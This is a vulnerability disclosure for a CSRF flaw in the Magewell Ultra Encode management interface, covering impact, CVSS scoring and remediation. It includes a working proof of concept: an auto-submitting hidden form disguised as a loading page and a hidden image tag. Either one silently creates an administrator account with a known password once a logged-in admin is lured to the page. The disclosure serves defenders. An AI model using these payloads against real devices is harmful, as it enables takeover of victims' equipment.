# CVE-2025-63953 - Magewell Ultra Encode CSRF Vulnerability

## Description

A Cross-Site Request Forgery (CSRF) vulnerability in the `/usapi?method=add-user` endpoint of **Magewell Ultra Encode** allows remote attackers to create user accounts (including administrative accounts) by tricking an authenticated administrator into visiting a malicious page. The endpoint performs a state-changing operation via HTTP GET without requiring or validating an anti-CSRF token, Origin, or Referer header.

## Vendor Information

- **Vendor**: Magewell  
- **Vendor Homepage**: https://www.magewell.com  
- **Affected Product**: Ultra Encode  
- **Affected Version**: Firmware 2.3.206  
- **Component**: Web-based management interface  

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Request Forgery (CSRF)  
- **Vulnerable Endpoint**:  
  `http://<device-ip>:8080/usapi?method=add-user`  
- **Attack Type**: Remote  
- **Attack Vector**:  
  An attacker hosts a malicious web page that triggers a cross-origin GET request to the `/usapi` endpoint (via hidden form, `<img src>`, `<iframe>`, script, etc.). When an authenticated administrator visits the page, their browser automatically sends the request using the existing session, resulting in unauthorized account creation.

## Impact

| Impact                          | Description                                                                 |
|---------------------------------|-----------------------------------------------------------------------------|
| **Privilege Escalation**        | Attacker can create new accounts with administrative privileges (`is-admin=1`) |
| **Unauthorized Account Creation** | Arbitrary user accounts can be added without victim consent                |
| **Complete Device Compromise**  | Newly created admin account enables direct login and full control          |
| **Broader Risk**                | All state-changing `/usapi` actions are potentially vulnerable to CSRF     |

**CVSS v3.1 Base Score (estimated)**: **8.8 (High)**  
`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

## Proof of Concept (PoC)

### Auto-submitting Form (no user interaction required after page load)

```html
<html>
  <body>
    <h1>Loading your configuration...</h1>
    <form id="csrf" method="GET" action="http://192.168.1.100:8080/usapi">
      <input type="hidden" name="method" value="add-user" />
      <input type="hidden" name="id" value="hacker" />
      <input type="hidden" name="pass" value="e3afed0047b08059d0fada10f400c1e5" /> <!-- MD5 of "admin123" -->
      <input type="hidden" name="is-admin" value="1" />
    </form>
    <script>
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>



zero click hidden image : <img src="http://192.168.1.100:8080/usapi?method=add-user&id=hacker&pass=e3afed0047b08059d0fada10f400c1e5&is-admin=1" width="1" height="1" style="display:none">




Steps to Reproduce

Ensure the Magewell Ultra Encode device is running firmware 2.3.206.
Log in to the web management interface (port 8080) as an administrator.
Host one of the PoC pages above on an attacker-controlled server.
Trick the administrator into visiting the malicious page (phishing email, forum link, etc.).
The victim's browser automatically creates the new user account using the active session.
Attacker can now log in with the newly created credentials (e.g., hacker : admin123 with admin rights).

Remediation

Upgrade to the latest firmware version that addresses this issue (contact Magewell support).
Implement standard CSRF countermeasures:
Require and validate anti-CSRF tokens
Enforce POST for all state-changing operations
Check Origin and/or Referer headers

Restrict management interface access (disable remote access or place behind a VPN).

References: 

Magewell Official Website: https://www.magewell.com
CVE Record: CVE-2025-63953

## Discovered by Mohamed Shahat (shiky8), Iyad Alkhatib (Hack4fun)

